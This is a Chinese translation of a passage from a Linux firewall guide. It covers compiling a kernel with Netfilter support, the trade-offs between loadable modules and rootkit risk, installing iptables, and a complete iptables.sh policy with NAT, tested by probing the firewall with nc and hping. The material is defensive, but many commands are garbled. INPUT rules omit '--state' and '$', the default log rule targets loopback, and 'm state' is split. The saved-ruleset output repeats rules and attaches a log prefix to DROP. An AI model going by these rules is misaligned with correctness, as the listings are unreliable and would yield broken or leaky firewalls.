虽然我在命令中选择了特定的内核版本，但类似的命令适用于更新的内核版本。例如，当例如 2.6.20.2 内核发布时，你只需要将上述命令中的 `2.6.20.1` 替换为 `2.6.20.2`。

### 注意

需要记住的一点是，`kernel.org` 服务器的负载多年来一直在增长，随机看一眼 [`www.kernel.org`](http://www.kernel.org) 上的带宽利用率图可以看到当前的利用率远高于 300 Mbps。为了帮助减轻负载，可以从 [`www.kernel.org/mirrors`](http://www.kernel.org/mirrors) 列出的镜像站点之一下载内核。一旦你的系统上有了特定版本的内核源码，你就可以下载并应用内核补丁文件来升级到下一个版本。（补丁文件比内核本身小得多。）





在开始编译之前，你必须构建一个内核配置文件。幸运的是，内核开发人员已经自动化了构建此文件的过程，只需单个命令即可启动（在 `/usr/src/linux-2.6.20.1` 目录下执行）：

```
$ make menuconfig
```

`make menuconfig` 命令会启动 Ncurses 接口，你可以在其中选择各种编译选项。（你可以分别通过 `make xconfig` 和 `make config` 命令调用 X Windows 界面或终端界面）。我选择 Ncurses 接口是因为它在简陋的终端界面和相对消耗资源的 X Windows 界面之间提供了很好的平衡。此外，Ncurses 接口还易于通过 SSH 会话对远程 Linux 内核进行配置，而无需转发 X Windows 连接。

执行 `make menuconfig` 后，我们将看到多个配置章节，范围从代码成熟度级别（Code Maturity Level）选项到库例程（Library Routines）。对于 2.6 系列内核，大多数 Netfilter 编译选项都位于“网络（Networking）”▸“网络选项（Networking Options）”下的“网络数据包过滤框架（Network Packet Filtering Framework (Netfilter))”章节中。

## 关键 Netfilter 编译选项

内核配置文件中需要开启的一些重要选项包括 Netfilter 连接跟踪、日志记录和数据包过滤。（请记住，iptables 是使用 Netfilter 提供的内核框架构建策略的。）

在“网络数据包过滤框架 (Netfilter)”章节中还有两个配置章节——核心 Netfilter 配置（Core Netfilter Configuration）和 IP: Netfilter 配置（IP: Netfilter Configuration）。

### 核心 Netfilter 配置

核心 Netfilter 配置章节包含了几个都应该启用的重要选项：

*   注释匹配支持（Comment match support）
*   FTP 支持
*   长度匹配支持（Length match support）
*   速率限制匹配支持（Limit match support）
*   MAC 地址匹配支持（MAC address match support）
*   `MARK` 目标支持
*   Netfilter 连接跟踪支持
*   通过 NFNETLINK 接口的 Netfilter `LOG`
*   Netfilter netlink 接口
*   Netfilter Xtables 支持
*   状态匹配支持（State match support）
*   字符串匹配支持（String match support）

### IP: Netfilter 配置

完成核心 Netfilter 配置后，我们将进入 IP: Netfilter 配置章节。在此章节应开启的选项如下：

*   ECN 目标支持
*   全 NAT
*   IP 地址范围匹配支持
*   IP tables 支持（过滤/伪装/NAT 必需）
*   IPv4 连接跟踪支持（NAT 必需）
*   `LOG` 目标支持
*   `MASQUERADE` 目标支持
*   所有者匹配支持（Owner match support）
*   数据包过滤
*   数据包改性（Packet mangling）
*   `raw` 表支持（NOTRACK/TRACE 必需）
*   近期匹配支持（Recent match support）
*   `REJECT` 目标支持
*   `TOS` 匹配支持
*   `TOS` 目标支持
*   `TTL` 匹配支持
*   `TTL` 目标支持
*   `ULOG` 目标支持

在 2.6 内核系列中，各个编译章节经过了重组。在旧的 2.4 系列中，IP: Netfilter 配置章节位于“网络选项”下方，且该章节仅在启用了“网络数据包过滤（Network Packet Filtering）”选项时才可见。

## 完成内核配置

通过 `menuconfig` 接口使用所需的 Netfilter 支持配置好 2.6.20.1 内核后，选择 `Exit` 保存内核配置文件，直到看到消息 *Do you wish to save your new kernel configuration?*。回答 `Yes`。

在保存了新的内核配置后，你将回到命令行 shell，你可以通过以下命令检查生成的 Netfilter 编译选项。

### 注意

这些命令的输出太长，无法在此列出，但大多数 Netfilter 选项（例如 `CONFIG_IP_NF_NAT` 和 `CONFIG_NETFILTER_XT_MATCH_STRING`）都包含 `_NF_` 子字符串或 `NETFILTER` 子字符串。

```
$ grep "_NF_" .config
$ grep NETFILTER .config
```

## 可加载内核模块与内置编译及安全性的

在上一节中开启的大多数 Netfilter 子系统可以被编译为可加载内核模块（LKM），可以在运行时动态加载或卸载到内核中；也可以直接编译到内核中，在这种情况下，它们无法在运行时加载或卸载。在上面的配置章节中，我们选择将大多数 Netfilter 子系统编译为 LKM。

将功能编译为 LKM 与直接编译到内核之间存在安全上的权衡。一方面，任何编译为 LKM 的功能都可以使用 `rmmod` 命令从运行中的内核中移除。如果在模块中发现了安全漏洞，这可以提供一种优势，因为在某些情况下，仅需卸载模块即可缓解该漏洞。同样，如果内核源码中已修复了该漏洞，则可以重新编译并部署模块，而无需完全关机系统；修复漏洞将实现零停机时间。

### 注意

内核中的 Netfilter 子系统并非免受偶发安全漏洞的影响。例如，在 Netfilter 日志子系统中处理 TCP 选项的代码中发现了一个漏洞（参阅 `http://www.netfilter.org/security/2004-06-30-2.6-tcpoption.html`）。如果日志子系统被编译为模块，则可以通过卸载该模块来牺牲 iptables 创建日志消息的能力以保护内核，这似乎是一个很好的权衡。

另一方面，如果在实现某功能的代码中发现了漏洞，且该代码被直接编译到内核中，那么修复漏洞的唯一方法是应用补丁、重新编译并重启整个系统。对于任务关键型系统（如企业 DNS 服务器），在可以安排停机窗口之前，这可能是不可行的，在此期间系统可能会受到内核级攻击的威胁。

## Rootkit 威胁

然而，故事并未此结束。编译一个带有模块支持的内核开启了一个阴险的可能性：如果攻击者成功攻破了系统，内核中的模块支持将使攻击者更容易安装内核级 rootkit。一旦内核本身被攻破，就可以对系统实施各种恶剧。诸如 Tripwire 等文件系统完整性检查器可以被欺骗，进程可以被隐藏，网络连接可以躲避 netstat 和 lsof 等工具的视线，甚至可以躲避（本地执行的数据包嗅探器）。然而，仅仅编译一个不支持模块的内核并不是万无一失的方案，因为并不是所有内核级 rootkit 都要求主机内核提供模块支持。例如，SucKIT rootkit 可以通过 `/dev/kmem` 设备直接操作内核内存，将自己加载到运行的内核中。SucKIT rootkit 在 Phrack 杂志的文章“Linux on-the-fly kernel patching without LKM”中引入安全领域（参阅 `http://www.phrack.org`）。





无论你选择何种编译 Netfilter 子系统的策略——无论是作为 LKM（内核模块）还是直接编译进内核——计算机安全中一个不可违越的事实是复杂性会导致不安全；越复杂的系统越难安全。幸运的是，`iptables` 高具有可性，既适用于描述如何处理和过滤网络流量的运行时规则语言，也适用于内核编译选项控制的支持功能类别。

为了降低运行在内核中的代码复杂性，请不要编译你不需要的功能。从运行的内核中移除不必要的代码有助于最大限度地减少隐藏在代码中尚未的漏洞带来的风险。

例如，如果你不需要日志支持，只需在 `menuconfig` 界面中不启用 `Log Target Support` 选项。如果你不需要对 FTP 连接进行状态跟踪，请禁用 `FTP Protocol Support` 选项。如果你不需要针对以太网标头中的 MAC 地址编写过滤规则，请禁用 `MAC Address Match Support` 选项。

只编译满足本地网络和/或主机网络及安全需求绝对必需的功能。

# 内核编译与安装

现在内核已经配置完成，我们将进入编译和安装阶段。如前所述，我们假设已经选择了所有其他必要的内核选项（如处理器架构），以为运行新内核的硬件提供适当支持。

要在 `/boot` 分区编译并安装新的 `2.6.20.1` 内核，请执行以下命令：

```
 $ make
$ su -
Password:
# mount /boot
# cd /usr/src/linux-2.6.20.1
# make install && make modules_install
```

上述命令的成功完成预示着需要配置引导程序并最终启动新的 `2.6.20.1` 内核。假设你正在使用 `GRUB` 引导程序且根分区挂载点为 `/dev/hda2`，请使用你喜欢的编辑器向 `/boot/grub/grub.conf` 文件添加以下几行：

```
 title  linux-2.6.20.1
root (hd0,0)
kernel /boot/vmlinuz-2.6.20.1 root=/dev/hda2
```

现在，重启！

```
 # shutdown -r now
```

# 安装 iptables 用户态二进制文件

在安装并进入已编译了 Netfilter 钩子的内核后，我们现在安装最新版本的 `iptables` 用户态程序。为此，首先在 `/usr/local/src` 目录下下载并解压最新的 `iptables` 源码，然后对照 [`www.netfilter.org`](http://www.netfilter.org) 发布的值检查 MD5 和：

```
 $ cd /usr/local/src/
$ wget http://www.netfilter.org/projects/iptables/files/iptables-1.3.7.tar.bz2
$ md5sum 1.3.7.tar.bz2
dd965bdacbb86ce2a6498829fddda6b7  iptables-1.3.7.tar.bz2
$ tar xfj iptables-1.3.7.tar.bz2
$ cd iptables-1.3.7
```

关于 `iptables` 二进制文件的编译和安装步骤，请记住我们在 `/usr/src/linux-2.6.20.1` 目录下编译了内核；编译 `iptables` 需要访问内核源码，因为它针对内核源码树中如 `include/linux/netfilter_ipv4` 等目录下的 C 头文件进行编译。我们将使用 `/usr/src/linux-2.6.20.1` 目录在命令行上定义 `KERNEL_DIR` 变量，`BINDIR` 和 `LIBDIR` 变量允许我们控制 `iptables` 二进制文件和库的安装路径。你可以按照以下方式编译并安装 `iptables`：

```
 $ make KERNEL_DIR=/usr/src/linux-2.6.20.1 BINDIR=/sbin LIBDIR=/lib
$ su -
Password:
# cd /usr/local/src/iptables-1.3.7
# make install KERNEL_DIR=/usr/src/linux-2.6.20.1 BINDIR=/sbin LIBDIR=/lib
```

为了最终证明我们已安装 `iptables` 它可以与运行的 `2.6.20.1` 内核交互，我们将发布命令显示 `iptables` 版本号，然后指示它列出 `INPUT`、`OUTPUT` 和 `FORWARD` 链中的当前规则集（此时这些链不包含任何活动规则）：

```
 # which iptables
/sbin/iptables
# iptables -V
iptables v1.3.7
# iptables -nL
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

### 注意

大多数 Linux 发行版已经安装了 `iptables`，因此你可能不需要经过上面的安装过程。然而，为了确保你的系统已经为本书中的讨论做好了准备工作，安装最新版本的 `iptables` 可能是一个好主意。正如你将在 第 9 章 中看到的。





- 最后，防火墙应配置为默认`log and drop stance`（记录并丢弃策略），这样任何未显式允许通过的随机数据包、端口扫描或其他连接尝试都将被记录并丢弃。

### 注意

我们假设防火墙上的外部 IP 地址由 ISP 静态分配，但动态分配的 IP 地址同样有效，因为我们是在防火墙上通过接口名称而非 IP 地址来限制外部网络的数据包。

为了简化构建 `iptables` 策略的任务，假设有一个单一的内部网络，其不可路由网络地址为 `192.168.10.0`，C 类子网掩码为 `255.255.255.0`（或 CIDR 表示法中的 `/24`）。

防火墙上的内部网络接口（参见图 1-2）为 `eth1`，IP 地址为 `192.168.10.1`，所有内部主机都将此地址作为默认网关。这允许内部系统将所有发往非 `192.168.10.0/24` 子网系统的数据包通过防火墙路由。防火墙上的外部接口为 `eth0`，为了保持网络无关性，我们为此接口指定了外部 IP 地址 `71.157.*X.*XX`。

![默认网络图](img/httpatomoreillycomsourcenostarchimages207402.png)

图 1-2. 默认网络图

图中表示了两个恶意系统：一个在内网上（`192.168.10.200`，主机名 `int_scanner`），另一个在外部网络上（`144.202.*X.*.*X`，主机名 `ext_scanner`）。此处包含了图 1-2）中的网络图作为参考，我们在随后的章节中也会引用它。另有说明，书中的所有流量示例都引用了图 1-2 中的网络图，你会在执行命令的 shell 提示符中使用图中的主机名，以便明确是哪个系统在生成或接收流量。

## iptables.sh 脚本序言

在开始 `iptables.sh` 脚本时，定义三个变量非常有帮助：`IPTABLES` 和 `MODPROBE`（用于 `iptables` 和 `modprobe` 二进制文件的路径）以及 `INT_NET`（用于内部子网地址和掩码），将贯穿整个脚本（见下文 ❶）。在 ❷ 处，任何现有的 `iptables` 规则将从运行内核中删除，过滤策略将 `INPUT`、`OUTPUT` 和 `FORWARD` 链设置为 `DROP`。此外，使用 `modprobe` 命令加载连接跟踪模块。

```
 [iptablesfw]# cat iptables.sh
#!/bin/sh
❶ IPTABLES=/sbin/iptables
MODPROBE=/sbin/modprobe
INT_NET=192.168.10.0/24

### 清空现有规则并将链策略设置为 DROP
echo "[+] Flushing existing iptables rules..."
❷ $IPTABLES -F
$IPTABLES -F -t nat
$IPTABLES -X
$IPTABLES -P INPUT DROP
$IPTABLES -P OUTPUT DROP
$IPTABLES -P FORWARD DROP
### 加载连接跟踪模块
$MODPROBE ip_conntrack
$MODPROBE iptable_nat
$MODPROBE ip_conntrack_ftp
$MODPROBE ip_nat_ftp
```

## INPUT 链

`INPUT` 链是 `iptables` 的构造，用于控制目标为本地系统的数据包（即在内核路由计算确定数据包目标为本地 IP 地址后）是否可以访问本地套字。如果 `INPUT` 链中的第一条规则指示 `iptables` 丢弃所有包（或 `INPUT` 链的策略设置为 `DROP`），则通过任何 IP 通信（如 TCP、UDP 或 ICMP）直接与系统通信的所有尝试将失败。`地址解析协议 (ARP)` 也是一类在以太网网上无处不在的重要流量。然而，由于 ARP 工作在数据链路层而非网络层，`iptables` 无法过滤此类流量，因为它只过滤 IP 流量及上层协议。

因此，无论 `iptables` 策略如何，ARP 请求和响应都会发送接收。（可以使用 `arptables` 过滤 ARP 流量，但该主题的讨论超出了本书的范围，因为我们通常关注网络层及以上层。）

### 注意

`iptables` 可以根据数据链路 MAC 地址过滤 IP 数据包，但前提是内核在编译时启用了 MAC 地址扩展。在 2.4 内核系列中，必须手动启用 MAC 地址扩展，而 2.6 内核系列默认启用。

继续开发 `iptables` shell 脚本，在序言之后，我们使用以下命令设置 `INPUT` 链。

```
 ###### INPUT 链 ######
echo "[+] Setting up INPUT chain..."
### 状态跟踪规则
❸ $IPTABLES -A INPUT -m state --state INVALID -j LOG --log-prefix "DROP "
-- 日志选项
-- tcp 选项
$IPTABLES -A INPUT -m state INVALID -j DROP
$IPTABLES -A INPUT -m state ESTABLISHED,RELATED -j ACCEPT

### 反伪装规则
❹ $IPTABLES -A INPUT -i eth1 -s !INT_NET -j LOG --log-prefix "SPOED PKT "
$IPTABLES -A INPUT -i eth1 -s !INT_NET -j DROP

### ACCEPT 规则
❺ $IPTABLES -A INPUT -i eth1 -p tcp -s $INT_NET --dport 22 --syn -m state NEW -j ACCEPT
$IPTABLES -A INPUT -p icmp --icmp-type echo-request -j ACCEPT

### 默认 INPUT 日志规则
❻ $IPTABLES -A INPUT -i lo -j LOG --log-prefix "DROP "
```

记得我们的防火墙策略要求 iptables 跟踪连接；不匹配有效状态的数据包应被记录并丢弃。这是通过从 ❸ 开始的三条 `iptables` 命令实现的；你将在 `OUTPUT` 和 `FORWARD` 链中看到类似的三条命令。这些规则都使用了状态匹配，并结合了 `INVALID`、`ESTABLISHED` 或 `RELATED` 则。`INVALID` 状态适用于无法被识别为属于任何现有连接的数据包——例如，一个凭空出现的 TCP FIN 包（即它不属于任何 TCP 会话）将匹配 `INVALID` 状态。只有在 Netfilter 连接跟踪系统看到双向数据包后，`ESTABLISHED` 状态才会触发（例如在正在交换数据的 TCP 连接中的确认包）。`RELATED` 状态描述了在 Netfilter 连接跟踪系统中启动新连接的数据包，但该连接与现有连接相关——例如，在数据包发送到没有服务器的 UDP 套接字后返回的 ICMP 端口不可达消息。





最后 ❻ 处是默认的 `LOG` 规则。回想脚本开头，未被 `INPUT` 链中某些规则接受的数据包将由分配给该链的 `DROP` 策略丢弃；这同样适用于 `OUTPUT` 和 `FORWARD` 链。如你所见，`INPUT` 链的配置非常简单，因为我们只需要接受来自内部网络的 `SSH` 守护进程的入站连接请求，对本地生成的网络流量启用状态跟踪，最后记录并丢弃不必要的数据包（包括来自内网的伪造数据包）。类似的配置也适用于 `OUTPUT` 和 `FORWARD` 链，如下文所示。

## OUTPUT 链

`OUTPUT` 链允许 `iptables` 对由本地系统生成的网络数据包应用内核级控制。例如，如果本地用户向外部系统发起了 `SSH` 会话，可以使用 `OUTPUT` 链来允许或拒绝传出的 `SYN` 数据包。

`iptables.sh` 脚本中构建 `OUTPUT` 链规则集的命令显示在下方：

```
 ###### OUTPUT chain ######
echo "[+] Setting up OUTPUT chain..."
### state tracking rules
$IPTABLES -A OUTPUT -m state --state INVALID -j LOG --log-prefix "DROP  INVALID "
--log-ip-options --log-tcp-options
$IPTABLES -A OUTPUT -m state --state INVALID -j DROP
$IPTABLES -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

### ACCEPT rules for allowing connections out
❼ $IPTABLES -A OUTPUT -p tcp --dport 21 --syn -m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 22 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 25 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 43 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 80 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 443 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p tcp --dport 4321 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p udp --dport 53 -m state --state NEW -j ACCEPT
$IPTABLES -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT

### default OUTPUT LOG rule
$IPTABLES -A OUTPUT -o ! lo -j LOG --log-prefix "DROP " --log-ip-options
--log-tcp-options
```

根据我们的策略要求，在 ❼ 处我们将假设从防火墙本身发起的连接将通过 `FTP`、`HTTP` 或 `HTTPS` 下载补丁或软件；发起外部 `SSH` 和 `SMTP` 连接；或对其他系统发出 `DNS` 或 `whois` 查询。

## FORWARD 链

到目前为止，我们添加到 `iptables` 过滤策略中的规则严格限制了数据包与防火墙系统直接交互的能力。此类数据包要么指向防火墙操作系统，要么源自防火墙操作系统，包括来自内部系统的 `SSH` 守护进程连接请求，或本地发起的向外部站点下载安全补丁的连接。

现在让我们来看 `iptables` 规则，这些规则涉及那些未与防火墙关联源地址或目的地址，但仍尝试通过防火墙系统路由的数据包。`filter` 表中的 `iptables` `FORWARD` 链提供了对跨越防火墙接口转发的数据包封装访问控制的能力：

```
 ###### FORWARD chain ######
echo "[+] Setting up FORWARD chain..."
### state tracking rules
$IPTABLES -A FORWARD -m state --state INVALID -j LOG --log-prefix "DROP INVALID "
--log-ip-options --log-tcp-options
$IPTABLES -A FORWARD -m state --state INVALID -j DROP
$IPTABLES -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

### anti-spoofing rules
$IPTABLES -A FORWARD -i eth1 -s ! $INT_NET -j LOG --log-prefix "SPOOFED PKT "
$IPTABLES -A FORWARD -i eth1 -s ! $INT_NET -j DROP

### ACCEPT rules
❽ $IPTABLES -A FORWARD -p tcp -i eth1 -s $INT_NET --dport 21 --syn - m state  --state
NEW -j ACCEPT
$IPTABLES -A FORWARD -p tcp -i eth1 -s $INT_NET --dport 22 --syn - m state  --state NEW
-j ACCEPT
$IPTABLES -A FORWARD -p tcp -i eth1 -s $INT_NET --dport 25 --syn - m state  --state NEW
-j ACCEPT
$IPTABLES -A FORWARD -p tcp -i eth1 -s $INT_NET --dport 43 --syn - m state  --state NEW
-j ACCEPT
$IPTABLES -A FORWARD -p tcp --dport 80 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A FORWARD -p tcp --dport 443 --syn - m state --state NEW -j ACCEPT
$IPTABLES -A FORWARD -p tcp -i eth1 -s $INT_NET --dport 4321 --syn - m state  --state
NEW -j ACCEPT
$IPTABLES -A FORWARD -p udp --dport 53 -m state --state NEW -j ACCEPT
$IPTABLES -A FORWARD -p icmp --icmp-type echo-request -j ACCEPT

### default OUTPUT LOG rule
$IPTABLES -A FORWARD -o ! lo -j LOG --log-prefix "DROP " --log-ip-options
--log-tcp-options
```

## 网络地址转换

构建 `iptables` 策略的最后一步是将不可路由的 `192.168.10.0/24` 地址转换为可路由的外部地址。这适用于入站连接以及从内部系统发起的出站连接。对于从内部系统发起的连接，我们将使用源 NAT (`SNAT`) 目标；对于从外部系统发起的连接，我们将使用目的 NAT (`DNAT`) 目标。`iptables` `nat` 表用于所有的 NAT 规则，表中有两个链：`PREROUTING` 和 `POSTROUTING`。`PREROUTING` 链用于对尚未通过内核路由算法的数据包应用 `nat` 表中的规则。在此链中处理的数据包尚未与 `filter` 表中的 `INPUT` 或 `FORWARD` 链进行比较。

`POSTROUTING` 链负责在数据包通过内核路由算法并要在计算出的接口上传输之前对其进行处理。通过此链处理的数据包已经通过了 `filter` 表中 `OUTPUT` 或 `FORWARD` 链的要求（以及其他可能注册的表的要求，例如 `mangle` 表）。

### 注意

关于 `iptables` 如何实现 NAT 的完整解释，请参见 [`www.netfilter.org/documentation/howto/nat-howto.html`](http://www.netfilter.org/documentation/howto/nat-howto.html)。

```
 ###### NAT rules ######
echo "[+] Setting up NAT rules..."
❾ $IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -i eth0 -j DNAT
--to 192.168.10.3:80
$IPTABLES -t nat -A PREROUTING -p tcp --dport 443 -i eth0 -j DNAT
--to 192.168.10.3:443
$IPTABLES -t nat -A PREROUTING -p tcp --dport 53 -i eth0 -j DNAT  --to 192.168.10.4:53
❿ $IPTABLES -t nat -A POSTROUTING -s $INT_NET -o eth0 -j MASQUERADE
```




参考图 1-2 中的网络图，内部网络 Web 服务器和 DNS 服务器的 IP 地址分别为 192.168.10.3 和 192.168.10.4。提供 NAT 功能所需的 `iptables` 命令如所示（注意通过 `-t` 选项将命令限制在 `nat` 表中）。位于 ❾ 处的三个 `PREROUTING` 规则允许来自外部网络的 Web 服务和 DNS 请求发送到相应的内部服务器。位于 ❿ 处的最后一个 `POSTROUTING` 规则允许源自内部不可网络且目标为外部互联网的连接看起来像是来自 IP 地址 71.157.*X.*X*。

构建 `iptables` 策略的最后最后一步是在 Linux 内核中启用 IP 转发功能：

```bash
###### forwarding ######
echo "[+] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## 激活策略

`iptables` 非常好的点之一是，通过执行 `iptables` 命令在内核中实例化策略是非常轻而易见的——没有沉重的用户界面、二进制文件格式或臃肿的管理协议（例如某些其他安全产品专用供应商开发的协议）。现在我们已经有了一个捕获 `iptables` 命令的 脚本（再次，你可以从 [`www.dydyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 下载完整的脚本），让我们来执行它：

```bash
[iptablesfw]# ./iptables.sh
[+] Flushing existing iptables rules...
[+] Setting up INPUT chain...
[+] Setting up OUTPUT chain...
[+] Setting up FORWARD chain...
[+] Setting up NAT rules...
[+] Enabling IP forwarding...
```

## iptables-save 和 iptables-restore

`iptables.sh` 脚本中之前所有的 `iptables` 命令都是按顺序逐执行，以实例化新规则、设置链的默认策略或删除旧规则。每个命令都需要单独执行 `iptables` 用户态二进制文件来创建 `iptables` 策略。因此，对于在系统启动时快速创建策略来说，这并不是最优解决方案，特别是当 `iptables` 规则数量增加到数百个时（这在使用 `fwsnort` 构建的策略时发生，正如我们在第 10 章所示）。`iptables-save` 和 `iptables-restore` 命令提供了一种快得多的机制，它们与主 `iptables` 程序安装在同一个目录下（在本例中为 `/sbin`）。`iptables-save` 命令创建一个包含运行策略中所有 `iptables` 规则的可读格式文件。这种格式可以被 `iptables-restore` 程序解释，该程序获取 `ipt.save` 文件中列出的每条规则并在运行内核中将其实例化。只需执行一次 `iptables-restore` 程序即可在内核中重建整个 `iptables` 策略；不需要多次执行 `iptables` 程序。这使得 `iptables-save` 和 `iptables-restore` 命令成为快速部署 `iptables` 规则集的理想选择，我通过以下两个命令来说明这一过程：

```bash
[iptablesfw]# iptables-save > /root/ipt.save
[iptablewfw]# cat /root/ipt.save | iptables-restore
```

`ipt.save` 文件的内容按 `iptables` 表组织，在每个针对单个表的节内，`ipt.save` 进一步按 `iptables` 链组织。以星号（`*`）字符开头跟随表名（例如 `filter`）的行表示 `ipt.save` 文件中描述特定表的节的开始。其后是跟踪与该表相关的每个链的数据包和字节计数的行。

`ipt.save` 文件的下一个部分是按链组织的所有 `iptables` 规则的完整描述。这些行允许 `iptables-restore` 重建实际的 `iptables` 规则集；如果 `iptables-save` 的 `-c` 选项，甚至包含了每条规则的数据包和字节计数。

最后，单独占一行的 `COMMIT` 结束了 `ipt.save` 文件中表征 `iptables` 表的节。此行构成了与表相关的所有信息的结束标记。以下是在我们执行了本章目前为止的所有 `iptables` 命令后，`filter` 表节的完整示例：

```text
 # Generated by iptables-save v1.3.7 on Sat Apr 14 17:35:22 2007
*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT DROP [2:112]
-A INPUT -m state --state INVALID -j LOG --log-prefix "DROP INVALID "
--log-tcp-options --log-ip-options
-A INPUT -m state --state INVALID -j DROP
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -s ! 192.168.10.0/255.255.255.0 -i eth1 -j LOG --log-prefix "SPOOFED PKT "
-A INPUT -s ! 192.168.10.0/255.255.255.0 -i eth1 -j LOG --log-prefix "SPOOFED PKT "
-A INPUT -m state --state INVALID -j DROP
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -s ! 192.168.10.0/255.255.255.0 -i eth1 -j DROP --log-prefix "DROPT "
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -s ! 192.168.10.0/255.255.255.0 -i eth1 -j LOG --log-prefix "SPOOFED PKT "
...
COMMIT
```



此时，我们已经有了一个功能性的 `iptables` 策略，它可以对试图通过防火墙接口的数据包保持高水平的控制，而且我们方便的方法可以通过对 `ipt.save` 文件执行 `iptables-restore` 命令来快速重新实例化该策略。这在加速系统启动周期方面具有明显的应用，但对于测试新策略同样有用，因为可以极易地恢复到已知的良好状态。然而还缺少了一点：修改 `iptables` 策略最简单的方法是编辑脚本，而不是直接编辑 `ipt.save` 文件（该文件对语法有严格要求，这种要求并不像 Bourne shell 脚本那样广为人知）。

## 测试策略：TCP

一旦在 Linux 内核中创建了 `iptables` 策略并验证了通过防火墙的基本连通性，对策略进行测试是一个很好的主意，以确保虚拟装甲没有漏洞。最重要的是从本地网络外部的主机测试 `iptables` 策略，因为这是大多数攻击的来源（假设有大量用户不在内部系统中）。然而，从内部网络进行有效测试同样重要，因为其中一个内部主机可能会被攻破并用于攻击其他内部主机（包括防火墙），即使 `iptables` 保护着整个网络。客户端漏洞（如微软 JPEG 漏洞）使得如果内部网络存在未打补丁的系统，这种情况就会成为可能。

要开始测试策略，我们首先测试从内部或外部网络都不应允许的 TCP 端口。回想 RFC 793 要求实现良好的 TCP 栈在关闭端口上接收到 SYN 数据包时生成重置（`RST/ACK`）包。这为我们提供了一个验证 `iptables` 确实拦截数据包的简单方法，因为如果响应连接尝试时没有 `RST/ACK` 包，说明 `iptables` 在内核中拦截了 SYN 数据包，并且没有允许 TCP 栈向客户端生成 `RST/ACK`。我们随机选择 TCP 端口 `5500` 从内部和外部主机进行测试。接下来的示例说明了这项测试并显示 `iptables` 的 `INPUT` 链确实正常工作，因为不仅数据包被丢弃了，而且生成了相应的日志消息。首先我们从 `ext_scanner` 系统使用 `Netcat` 尝试连接防火墙上的 TCP 端口 `5500`。如预期所示，`Netcat` 客户端只是挂起，而在防火墙本身上生成了一条日志消息，表明 `iptables` 拦截并丢弃了一个指向端口 5500 的 TCP SYN 数据包：

```
 [ext_scanner]$ nc -v 71.157.X.X 5500
[iptablesfw]# tail /var/log/messages |grep 5500
Apr 14 16:52:43 iptablesfw kernel: DROP IN=eth0 OUT= MAC=00:13:d3:38:b6:e4:00:30:48:
80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X LEN=60 TOS=0x00 PREC=0x00 TTL=64
ID=54983 DF PROTO=TCP SPT=59604 DPT=5500 WINDOW=5840 RES=0x00 SYN URGP=0 OPT
(020405B40402080A1E9241460000000001030306)
```

### 注意

上面的 `iptables` 日志消息是书中的第一个，你可能会发现理解它很困难。我将在第 2 章和第 3 章中详细介绍 `iptables` 日志消息（并旨在识别可疑流量）。

同样，我们从内部网络得到了相同的结果：

```
 [int_scanner]$ nc -v 192.168.10.1 5500
[iptablesfw]# tail /var/log/messages |grep 5500 |tail -n 1
Apr 14 16:55:53 iptablesfw kernel: DROP IN=eth1 OUT= MAC=00:13:46:3a:41:4b:00:a0:cc:
28:42:5a:08:00 SRC=192.168.10.200 DST=192.168.10.1 LEN=60 TOS=0x10 PREC=0x00 TTL=64
ID=4858 DF PROTO=TCP SPT=58715 DPT=5500 WINDOW=5840 RES=0x00 SYN URGP=0 OPT
(020405B40402080A0039F4D30000000001030305)
```

如果我们收到了 `RST/ACK` 包，将意味着 `iptables` 没有拦截流量。




最后，我们将测试 ICMP 的 iptables 策略。在构建策略时使用的 iptables 命令使用了 `--icmp-type` 选项，将接受的 ICMP 数据包限制为仅 Echo Request（回显请求）包（连接跟踪代码允许发送相应的 Echo Reply（回显响应）包，因此不需要添加显式的 `ACCEPT` 规则来允许此类应答）。因此，iptables 应该允许所有的 Echo Request 包，但其他 ICMP 数据包将遭遇完全的沉默。我们通过在不发送任何相应 Echo Request 包 的情况下生成 ICMP Echo Reply 包来测试这一点，这将导致 iptables 在 `INPUT` 链开头的 `INVALID` 状态规则上匹配包。再次，我们转向 hping，从内部和外部网络进行测试。第一个测试是从外部网络生成一个不受请求的 ICMP Echo Reply 包，我们预计 iptables 将在 `INPUT` 链中记录并丢弃该包。通过检查 iptables 日志，我们看到确实如此（**DROP INVALID** 日志前缀为加粗显示）：

```
 [ext_scanner]# hping −1 --icmptype echo-reply 71.157.X.X
HPING (eth1 71.157.X.X): icmp mode set, 28 headers + 0 data bytes
--- 71.157.X.X hping statistic ---
2 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
[iptablesfw]# tail /var/log/messages |grep ICMP
Apr 14 17:04:58 iptablesfw kernel: DROP INVALID IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=28 TOS=0x00 PREC=0x00 TTL=64 ID=44271 PROTO=ICMP TYPE=0 CODE=0 ID=21551
SEQ=0
```

同样，从内部网络也获得了相同的结果：

```
 [int_scanner]# hping −1 --icmptype echo-reply 192.168.10.1
HPING (eth1 192.168.10.1): icmp mode set, 28 headers + 0 data bytes
--- 192.168.10.1 hping statistic ---
